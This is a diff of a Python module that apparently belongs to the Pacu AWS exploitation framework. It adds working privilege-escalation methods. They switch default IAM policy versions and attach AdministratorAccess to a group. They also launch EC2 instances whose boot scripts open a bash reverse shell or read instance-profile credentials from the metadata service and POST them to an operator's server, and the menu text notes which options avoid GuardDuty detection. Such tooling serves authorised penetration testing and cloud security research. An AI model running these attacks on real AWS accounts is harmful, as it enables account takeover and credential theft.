@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import argparse
+from botocore.exceptions import ClientError
+import string
 from copy import deepcopy
 import json
 import os
@@ -472,7 +474,7 @@ def summary(data, pacu_main):
     if data['scan_only']:
         return '  Scan Complete'
     else:
-        if data['success']:
+        if 'success' in data and data['success']:
             out = '  Privilege escalation was successful'
         else:
             out = '  Privilege escalation was not successful'
@@ -545,6 +547,8 @@ def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
                     if 'PolicyArn' in policy and 'arn:aws:iam::aws' not in policy['PolicyArn']:
                         valid_group_policies.append(deepcopy(policy))
 
+            print('      {} valid group-attached policy(ies) found.\n'.format(len(valid_group_policies)))
+
             if len(valid_group_policies) > 1:
                 for i in range(0, len(valid_group_policies)):
                     print('        [{}] {}'.format(i, valid_group_policies[i]['PolicyName']))
@@ -608,17 +612,348 @@ def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
 
 
 def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+
+    print('  Starting method SetExistingDefaultPolicyVersion...\n')
+    client = pacu_main.get_boto3_client('iam')
+
+    policy_arn = input('    Is there a specific policy you want to target? Enter its ARN now (just hit enter to automatically figure out a list of valid policies to check): ')
+
+    target_policy = {}
+    all_potential_policies = []
+    potential_user_policies = []
+    potential_group_policies = []
+
+    if not policy_arn:
+        print('    No policy ARN entered, now finding a valid policy...\n')
+
+        active_aws_key = session.get_active_aws_key(pacu_main.database)
+
+        if active_aws_key.policies:
+            all_user_policies = active_aws_key.policies
+
+            for policy in all_user_policies:
+                if 'PolicyArn' in policy.keys() and 'arn:aws:iam::aws' not in policy['PolicyArn']:
+                    potential_user_policies.append(deepcopy(policy))
+
+        # If no valid user-attached policies found, try groups
+        if active_aws_key.groups:
+            groups = active_aws_key.groups
+
+            for group in groups:
+                for policy in group['Policies']:
+                    if 'PolicyArn' in policy and 'arn:aws:iam::aws' not in policy['PolicyArn']:
+                        potential_group_policies.append(deepcopy(policy))
+
+        # If it looks like permissions haven't been/attempted to be enumerated
+        if not policy_arn and active_aws_key.allow_permissions == {}:
+            fetch = input('    It looks like the current users confirmed permissions have not been enumerated yet, so no valid policy can be found, enter "y" to run the confirm_permissions module to enumerate the required information, enter the ARN of a policy to create a new version for, or "n" to skip this privilege escalation module ([policy_arn]/y/n): ')
+            if fetch.strip().lower() == 'n':
+                print('    Cancelling SetExistingDefaultPolicyVersion...\n')
+                return False
+
+            elif fetch.strip().lower() == 'y':
+                if fetch_data(None, 'confirm_permissions', '', force=True) is False:
+                    print('Pre-req module not run successfully. Skipping method...\n')
+                    return False
+                return SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data)
+
+            else:  # It is an ARN
+                policy_arn = fetch
+
+    if not policy_arn:  # If no policy_arn yet, check potential group and user policies
+        policies_with_versions = []
+        all_potential_policies.extend(potential_user_policies)
+        all_potential_policies.extend(potential_group_policies)
+
+        for policy in all_potential_policies:
+            response = client.list_policy_versions(
+                PolicyArn=policy['PolicyArn']
+            )
+            versions = response['Versions']
+            while response['IsTruncated']:
+                response = client.list_policy_versions(
+                    PolicyArn=policy['PolicyArn'],
+                    Marker=response['Marker']
+                )
+                versions.extend(response['Versions'])
+            if len(versions) > 1:
+                policy['Versions'] = versions
+                policies_with_versions.append(policy)
+        if len(policies_with_versions) > 1:
+            print('Found {} policy(ies) with multiple versions. Choose one below.\n'.format(len(policies_with_versions)))
+            for i in range(0, len(policies_with_versions)):
+                print('  [{}] {}: {} versions'.format(i, policies_with_versions[i]['PolicyName'], len(policies_with_versions[i]['Versions'])))
+            choice = input('Choose an option: ')
+            target_policy = policies_with_versions[choice]
+        elif len(policies_with_versions) == 1:
+            target_policy = policies_with_versions[0]
+    else:
+        while policy_arn:  # Run until we get a policy with multiple versions or they cancel
+            target_policy['PolicyArn'] = policy_arn
+            response = client.list_policy_versions(
+                PolicyArn=policy_arn
+            )
+            versions = response['Versions']
+            while 'IsTruncated' in response and response['IsTruncated'] is True:
+                response = client.list_policy_versions(
+                    PolicyArn=policy_arn,
+                    Marker=response['Marker']
+                )
+                versions.extend(response['Versions'])
+            target_policy['Versions'] = versions
+            if len(versions) == 1:
+                policy_arn = input('  The policy ARN you supplied only has one valid version. Enter another policy ARN to try again, or press enter to skip to the next privilege escalation method: ')
+                if not policy_arn:
+                    return False
+            else:
+                break
+
+    if not target_policy:  # If even after everything else, there is still no policy: exit
+        print('  All methods of enumerating a valid policy have failed. Skipping to the next privilege escalation method...\n')
+        return False
+
+    print('Now printing the policy document for each version of the target policy...\n')
+    for version in target_policy['Versions']:
+        version_document = client.get_policy_version(
+            PolicyArn=target_policy['PolicyArn'],
+            VersionId=version['VersionId']
+        )['PolicyVersion']['Document']
+        if version['IsDefaultVersion'] is True:
+            print('Version (default): {}\n'.format(version['VersionId']))
+        else:
+            print('Version: {}\n'.format(version['VersionId']))
+
+        print(version_document)
+        print('')
+    new_version = input('What version would you like to switch to (example: v1)? Just press enter to keep it as the default: ')
+    if not new_version:
+        print('  Keeping the default version as is.\n')
+        return False
+
+    try:
+        client.set_default_policy_version(
+            PolicyArn=target_policy['PolicyArn'],
+            VersionId=new_version
+        )
+        print('  Successfully set the default policy version to {}!\n'.format(new_version))
+        return True
+    except Exception as error:
+        print('  Failed to set a new default policy version: {}\n'.format(error))
+        return False
 
 
 def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+
+    print('  Starting method CreateEC2WithExistingIP...\n')
+
+    regions = pacu_main.get_regions('ec2')
+    region = None
+
+    if len(regions) > 1:
+        print('  Found multiple valid regions. Choose one below.\n')
+        for i in range(0, len(regions)):
+            print('  [{}] {}'.format(i, regions[i]))
+        choice = input('What region do you want to launch the EC2 instance in? ')
+        region = regions[int(choice)]
+    elif len(regions) == 1:
+        region = regions[0]
+    else:
+        while not region:
+            all_ec2_regions = pacu_main.get_regions('ec2', check_session=False)
+            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
+            if not region:
+                return False
+            elif region not in all_ec2_regions:
+                print('    Region {} is not a valid EC2 region. Please choose a valid region. Valid EC2 regions include:\n'.format(region))
+                print(all_ec2_regions)
+                region = None
+
+    amis_by_region = {
+        'us-east-2': 'ami-8c122be9',
+        'us-east-1': 'ami-b70554c8',
+        'us-west-1': 'ami-e0ba5c83',
+        'us-west-2': 'ami-a9d09ed1',
+        'ap-northeast-1': 'ami-e99f4896',
+        'ap-northeast-2': 'ami-afd86dc1',
+        'ap-south-1': 'ami-d783a9b8',
+        'ap-southeast-1': 'ami-05868579',
+        'ap-southeast-2': 'ami-39f8215b',
+        'ca-central-1': 'ami-0ee86a6a',
+        'eu-central-1': 'ami-7c4f7097',
+        'eu-west-1': 'ami-466768ac',
+        'eu-west-2': 'ami-b8b45ddf',
+        'eu-west-3': 'ami-2cf54551',
+        'sa-east-1': 'ami-6dca9001'
+    }
+    ami = amis_by_region[region]
+
+    print('    Targeting region {}...'.format(region))
+
+    client = pacu_main.get_boto3_client('iam')
+
+    response = client.list_instance_profiles()
+    instance_profiles = response['InstanceProfiles']
+    while 'IsTruncated' in response and response['IsTruncated'] is True:
+        response = client.list_instance_profiles(
+            Marker=response['Marker']
+        )
+        instance_profiles.extend(response['InstanceProfiles'])
+
+    instance_profiles_with_roles = []
+    for ip in instance_profiles:
+        if len(ip['Roles']) > 0:
+            instance_profiles_with_roles.append(ip)
+
+    if len(instance_profiles_with_roles) > 1:
+        print('  Found multiple instance profiles. Choose one below. Only instance profiles with roles attached are shown.\n')
+        for i in range(0, len(instance_profiles_with_roles)):
+            print('  [{}] {}'.format(i, instance_profiles_with_roles[i]['InstanceProfileName']))
+        choice = input('What instance profile do you want to use? ')
+        instance_profile = instance_profiles_with_roles[int(choice)]
+    elif len(instance_profiles_with_roles) == 1:
+        instance_profile = instance_profiles[0]
+    else:
+        print('    No instance profiles with roles attached were found in region {}. Skipping to the next privilege escalation method...\n'.format(region))
+        return False
+
+    while True:
+        client = pacu_main.get_boto3_client('ec2', region)
+        print('Ready to start the new EC2 instance. What would you like to do?')
+        print('  1) Open a reverse shell on the instance back to a server you control. Note: Restart the instance to resend the reverse shell connection (will not trigger GuardDuty, requires outbound internet).')
+        print('  2) Run an AWS CLI command using the instance profile credentials on startup. Note: Restart the instance to run the command again (will not trigger GuardDuty, requires outbound internet).')
+        print('  3) Make an HTTP POST request with the instance profiles credentials on startup. Note: Restart the instance to get a fresh set of credentials sent to you(will trigger GuardDuty finding type UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration when using the keys outside the EC2 instance, requires outbound internet).')
+        print('  4) Try to create an SSH key through AWS, allowing you SSH access to the instance (requires inbound access to port 22).')
+        print('  5) Skip this privilege escalation method.')
+        method = int(input('Choose one [1-5]: '))
+
+        if method == 1:
+            # Reverse shell
+            external_server = input('The EC2 instance will try to connect to your server using a bash reverse shell. To listen for this, run the command "nc -nlvp <an open port>" from your server where port <an open port> is open to accept the connection. What is the IP and port of your server (example: 127.0.0.1:80)? ')
+            reverse_shell = 'bash -i >& /dev/tcp/{} 0>&1'.format(external_server.rstrip().replace(':', '/'))
+            try:
+                response = client.run_instances(
+                    ImageId=ami,
+                    UserData='#cloud-boothook\n#!/bin/bash\n{}'.format(reverse_shell),
+                    MaxCount=1,
+                    MinCount=1,
+                    InstanceType='t2.micro',
+                    IamInstanceProfile={
+                        'Arn': instance_profile['Arn']
+                    }
+                )
+
+                print('Successfully created the EC2 instance, you should receive a reverse connection to your server soon (may take up to 5 minutes in some cases).\n')
+                print('  Instance details:')
+                print(response)
+
+                return True
+            except Exception as error:
+                print('Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
+        elif method == 2:
+            # Run AWS CLI command
+            aws_cli_command = input('What is the AWS CLI command you would like to execute (example: "aws iam get-user --user-name Bob")? ')
+            try:
+                response = client.run_instances(
+                    ImageId=ami,
+                    UserData='#cloud-boothook\n#!/bin/bash\n{}'.format(aws_cli_command),
+                    MaxCount=1,
+                    MinCount=1,
+                    InstanceType='t2.micro',
+                    IamInstanceProfile={
+                        'Arn': instance_profile['Arn']
+                    }
+                )
+
+                print('Successfully created the EC2 instance, your AWS CLI command should run soon (may take up to 5 minutes in some cases).\n')
+                print('  Instance details:')
+                print(response)
+
+                return True
+            except Exception as error:
+                print('Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
+        elif method == 3:
+            # HTTP POST
+            http_server = input('The EC2 instance will make an HTTP POST request to your server containing temporary credentials for the instance profile. Where should this data be POSTed (example: http://my-server.com/creds)? ')
+            try:
+                response = client.run_instances(
+                    ImageId=ami,
+                    UserData='#cloud-boothook\n#!/bin/bash\nip_name=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)\nkeys=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ip_name)\ncurl -X POST -d "$keys" {}'.format(http_server),
+                    MaxCount=1,
+                    MinCount=1,
+                    InstanceType='t2.micro',
+                    IamInstanceProfile={
+                        'Arn': instance_profile['Arn']
+                    }
+                )
+
+                print('Successfully created the EC2 instance, you should receive a POST request with the instance credentials soon (may take up to 5 minutes in some cases).\n')
+                print('  Instance details:')
+                print(response)
+
+                return True
+            except Exception as error:
+                print('Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
+        elif method == 4:
+            # Create SSH key
+            ssh_key_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+            try:
+                response = client.create_key_pair(
+                    KeyName=ssh_key_name,
+                    DryRun=True
+                )
+            except ClientError as error:
+                if not str(error).find('UnauthorizedOperation') == -1:
+                    print('Dry run failed, you do not have permission to create an SSH key. Try a different method.\n')
+                    continue
+            response = client.create_key_pair(
+                KeyName=ssh_key_name
+            )
+            ssh_private_key = response['KeyMaterial']
+            ssh_fingerprint = response['KeyFingerprint']
+
+            try:
+                response = client.run_instances(
+                    ImageId=ami,
+                    KeyName=ssh_key_name,
+                    MaxCount=1,
+                    MinCount=1,
+                    InstanceType='t2.micro',
+                    IamInstanceProfile={
+                        'Arn': instance_profile['Arn']
+                    }
+                )
+
+                print('Successfully created the EC2 instance, you can now SSH in using the private key printed below.\n')
+                print('  Instance details:')
+                print(response)
+
+                with open('./sessions/{}/downloads/{}'.format(session.name, ssh_key_name), 'w+') as priv_key_file:
+                    priv_key_file.write(ssh_private_key)
+                print('  SSH private key (also saved to ./sessions/{}/downloads/{}):'.format(session.name, ssh_key_name))
+                print(ssh_private_key)
+
+                print('  SSH fingerprint:')
+                print(ssh_fingerprint)
+
+                return True
+            except Exception as error:
+                print('Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
+        else:
+            # Skip
+            print('Skipping to next privilege escalation method...\n')
+            return False
 
 
 def CreateAccessKey(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
 
-    print('  Starting method CreateAccessKey...')
+    print('  Starting method CreateAccessKey...\n')
 
     username = input('    Is there a specific user you want to target? They must not already have two sets of access keys created for their user. Enter their user name now or just hit enter to enumerate users and view a list of options: ')
     if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
@@ -652,7 +987,7 @@ def CreateAccessKey(pacu_main, print, input, fetch_data):
 def CreateLoginProfile(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
 
-    print('  Starting method CreatingLoginProfile...')
+    print('  Starting method CreatingLoginProfile...\n')
 
     username = input('    Is there a specific user you want to target? They must not already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: ')
     if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
@@ -694,7 +1029,7 @@ def CreateLoginProfile(pacu_main, print, input, fetch_data):
 def UpdateLoginProfile(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
 
-    print('  Starting method UpdateLoginProfile...')
+    print('  Starting method UpdateLoginProfile...\n')
 
     username = input('    Is there a specific user you want to target? They must already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: ')
     if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
@@ -735,7 +1070,7 @@ def UpdateLoginProfile(pacu_main, print, input, fetch_data):
 def AttachUserPolicy(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
 
-    print('  Starting method AttachUserPolicy...')
+    print('  Starting method AttachUserPolicy...\n')
 
     client = pacu_main.get_boto3_client('iam')
 
@@ -747,17 +1082,58 @@ def AttachUserPolicy(pacu_main, print, input, fetch_data):
         active_aws_key = session.get_active_aws_key(pacu_main.database)
         client.attach_user_policy(
             UserName=active_aws_key['UserName'],
-            policy_arn=policy_arn
+            PolicyArn=policy_arn
         )
         print('  Successfully attached policy {} to the current user! You should now have access to the permissions associated with that policy.'.format(policy_arn))
         return True
-    except Exception as e:
-        print('  Failed to attach policy {} to the current user:\n{}'.format(policy_arn, e))
+    except Exception as error:
+        print('  Failed to attach policy {} to the current user:\n{}'.format(policy_arn, error))
         return False
 
 
 def AttachGroupPolicy(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+
+    print('  Starting method AttachGroupPolicy...\n')
+
+    active_aws_key = session.get_active_aws_key(pacu_main.database)
+    client = pacu_main.get_boto3_client('iam')
+
+    group = input('    Is there a specific group you want to target? Enter its name now or just hit enter to automatically find a valid group: ')
+
+    if not group:
+        if len(active_aws_key.groups) > 1:
+            choice = ''
+            while choice == '':
+                print('Found {} groups that the current user belongs to. Choose one below.'.format(len(active_aws_key.groups)))
+                for i in range(0, len(active_aws_key.groups)):
+                    print('  [{}] {}'.format(i, active_aws_key.groups[i]['GroupName']))
+                choice = input('Choose an option: ')
+            group = active_aws_key.groups[int(choice)]['GroupName']
+        elif len(active_aws_key.groups) == 1:
+            print('Found 1 group that the current user belongs to.\n')
+            group = active_aws_key.groups[0]['GroupName']
+        else:
+            print('  Did not find any groups that the user belongs to. Skipping to the next privilege escalation method...\n')
+            return False
+
+    print('Targeting group: {}\n'.format(group))
+
+    policy_arn = input('    Is there a specific policy you want to add to the target group? Enter its ARN now or just hit enter to attach the AWS managed AdministratorAccess policy (arn:aws:iam::aws:policy/AdministratorAccess): ')
+    if not policy_arn:
+        policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
+
+    try:
+        active_aws_key = session.get_active_aws_key(pacu_main.database)
+        client.attach_group_policy(
+            GroupName=group,
+            PolicyArn=policy_arn
+        )
+        print('  Successfully attached policy {} to the group {}! You should now have access to the permissions associated with that policy.\n'.format(policy_arn, group))
+        return True
+    except Exception as error:
+        print('  Failed to attach policy {} to the group {}.\n{}'.format(policy_arn, group, error))
+        return False
 
 
 def AttachRolePolicy(pacu_main, print, input, fetch_data):
@@ -779,7 +1155,7 @@ def PutRolePolicy(pacu_main, print, input, fetch_data):
 def AddUserToGroup(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
 
-    print('  Starting method AddUserToGroup...')
+    print('  Starting method AddUserToGroup...\n')
 
     client = pacu_main.get_boto3_client('iam')
 
@@ -840,7 +1216,7 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
 def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
 
-    print('  Starting method UpdateExistingGlueDevEndpoint...')
+    print('  Starting method UpdateExistingGlueDevEndpoint...\n')
 
     endpoint_name = input('    Is there a specific Glue Development Endpoint you want to target? Enter the name of it now or just hit enter to enumerate development endpoints and view a list of options: ')
     pub_ssh_key = input('    Enter your personal SSH public key to access the development endpoint (in the format of an authorized_keys file: ssh-rsa AAASDJHSKH....AAAAA== name) or just hit enter to skip this privilege escalation attempt: ')
@@ -872,7 +1248,7 @@ def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
             PublicKey=pub_ssh_key
         )
         print('  Successfully updated the public key associated with the Glue Development Endpoint {}. You can now SSH into it and access the IAM role associated with it through the AWS CLI.'.format(endpoint_name))
-        if not choice == 0:
+        if not int(choice) == 0:
             print('  The hostname for this development endpoint was already stored in this session: {}'.format(dev_endpoints[int(choice) - 1]['PublicAddress']))
     except Exception as e:
         print('    Failed to update Glue Development Endpoint {}:\n{}'.format(endpoint_name, e))
